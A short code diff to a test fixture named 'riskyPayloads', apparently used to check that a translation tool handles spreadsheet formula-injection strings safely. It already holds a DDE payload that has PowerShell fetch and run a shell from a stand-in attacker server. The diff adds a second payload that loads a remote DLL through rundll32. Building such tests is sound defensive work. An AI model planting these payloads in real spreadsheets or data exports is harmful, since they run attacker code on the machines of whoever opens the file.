@@ -55,6 +55,10 @@ export const riskyPayloads: IntermediateTranslationFormat = {
     {
       term: `=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0`,
       translation: 'wget attacker server shell',
-    }
+    },
+    {
+      term: `=cmd|'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1`,
+      translation: 'rundll32 extension',
+    },
   ],
 };
